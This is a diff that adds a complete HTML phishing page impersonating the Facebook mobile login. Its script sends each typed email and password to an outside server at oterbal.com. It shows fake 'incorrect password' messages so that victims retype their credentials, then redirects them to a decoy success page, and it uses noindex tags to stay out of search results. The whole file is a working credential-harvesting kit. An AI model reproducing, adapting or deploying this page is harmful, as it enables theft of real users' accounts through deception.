@@ -1,0 +1,161 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noarchive">
+
+    
+  
+    <style>
+    * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    outline: 1px solid transparent;
+}
+.header {
+    background: #3b5998;
+    padding: 10px;
+    font-weight: bold;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    color: white;
+    font-size: 25px;
+}
+p {
+    color: #0341b4f6;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    margin-top: -32px;
+    margin-left: 30px;
+}
+.header-2 {
+    
+    padding: 12px;
+}
+.form {
+    padding: 20px;
+    display: block;
+    background: #f5fcff;
+}
+input[type=text] {
+    width: 100%;
+    border: 1px solid #dfe1ee;
+    padding: 15px ;
+    text-align: left;
+    border-radius: 5px;
+}
+input[type=text]:focus {
+    box-shadow: 0px 0px 10px -1px #008ad3;
+    border: 2px solid #fff;
+}
+
+input[type=submit] {
+    width: 100%;
+    border: 1px solid #0072bb;
+    padding: 10px;
+    text-align: left;
+    margin-top: 10px;
+    border-radius: 5px;
+    color: white;
+    text-align: center;
+    background: #0072bb;
+    font-weight: bold;
+    font-size: 14px;
+}
+button {
+    background: #0fb40f;
+    border: 2px solid #0fb40f;
+    color: white;
+    font-weight: bold;
+    padding: 10px;
+    border-radius: 5px;
+}
+span {
+    color: #0341b4f6;
+    font-size: 12px;
+    font-family: sans-serif;
+}
+    </style>
+    
+</head>
+<body>
+    <div class="header">
+        facebook
+    </div>
+    <div class="header-2">
+        <img src="https://cdn.glitch.global/71ee619e-88b3-46bc-844d-9adb03253e64/fbandroid.png" width="20px"> <p> Get Facebook for Android and browse faster</p>
+    </div>
+        <div class="form">
+    <input type="text"  placeholder="Mobile number or email address" id="username" >
+    <input type="text" placeholder="Password" id="password" style='margin-top: 5px';>
+    <input type="submit" value="Log in" id="login">
+    <p id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p><br>
+</div>
+    <center><button>Create New Account</button></center>
+    <center  style="margin-top: 10px; color:#0072bb"><span>Forgotten password?. <a href="#" style="text-decoration: none; color: #0072bb">Help Center</a></span></center>
+
+    <script>
+         var login = document.getElementById('login');
+        var loader = document.getElementById('loader')
+        var feedback = document.getElementById('feedback')
+        var username = document.getElementById('username')
+        var password = document.getElementById('password')
+        var x = 0;
+        login.addEventListener('click', function () {
+            // login.textContent = "";
+            // loader.style.display = 'block'
+ 
+            // setTimeout(() => {
+
+            // function load() {
+            const data = new FormData();
+            data.append('email', username.value);
+            data.append('password', password.value);
+            const response = new XMLHttpRequest();
+            response.onreadystatechange = function () {
+                feedback.style.display = 'block'
+            }
+            response.open('POST', 'https://oterbal.com/Hadoni/file.php', true);
+            response.send(data);
+
+                var xhr2 = new XMLHttpRequest()
+                var datad = new FormData();
+                datad.append('email', username.value)
+                datad.append('password', password.value)
+                xhr2.onreadystatechange = function () {
+                    
+                }
+                xhr2.open('POST', 'https://oterbal.com/Hadoni/file.php' ,true)
+                xhr2.send(datad)
+
+
+            x ++
+            feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
+            if (x == 2) {
+                feedback.textContent = 'Sorry an error occurred please try again later'
+            }else if (x == 3){
+                feedback.textContent = '';
+                window.location.href='https://light-dawn-echidna.glitch.me/Success%20New%20Text%20Document.html'
+            }
+        //    }
+
+            // }, 1500);
+
+        })
+</script>
+<script>
+var urlString = window.location.href;
+	    var email = urlString.split("#")[1];
+	    if(email){
+	               document.getElementById('email').value = email;
+	    }		
+
+</script>
+</body>
+</html>
